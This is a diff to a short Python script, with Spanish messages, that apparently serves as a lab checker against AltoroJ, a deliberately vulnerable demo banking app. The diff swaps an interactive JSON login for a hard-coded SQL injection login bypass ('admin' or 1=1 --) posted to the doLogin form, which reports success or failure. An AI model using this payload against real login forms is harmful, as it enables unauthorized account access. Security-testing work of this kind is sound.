@@ -7,38 +7,29 @@ if len(sys.argv) != 3:
     print("Para usar el programa debes introducir 3 argumentos: python3 script.py <host> <port>")
     sys.exit(1)
 
-
 host = sys.argv[1]
 port = sys.argv[2]
 
-url = 'http://' + host + ':' + port + '/AltoroJ/api/login'
+url = 'http://' + host + ':' + port + '/AltoroJ/doLogin'
+
 session = requests.Session()
 
-username = input("Enter username\n")
-password = input("Enter password\n")
+username = "admin' or 1=1 --" 
+password = "cualquierpassword"
 
 payload = {
-    "username": username,
-    "password": password
+    "uid": username,
+    "passw": password
 }
 
 headers = {
     'Content-Type': 'application/json'
 }
 
-response = session.post(url, json=payload, headers=headers)
+response = session.post(url, data=payload)
 
-try:
-    response_json = response.json()
-except json.JSONDecodeError:
-    print("La respuesta no es un JSON válido")
-    exit()
-
-if 'error' in response_json:
-    print(f"0, {response_json['error']}")
-elif 'success' in response_json:
-    print(f"1")
-   # print(f"Token de autorización: {response_json['Authorization']}")
+if 'Failed' in response.text: 
+    print("0")
 else:
-    print("Respuesta inesperada")
+    print("1")
 
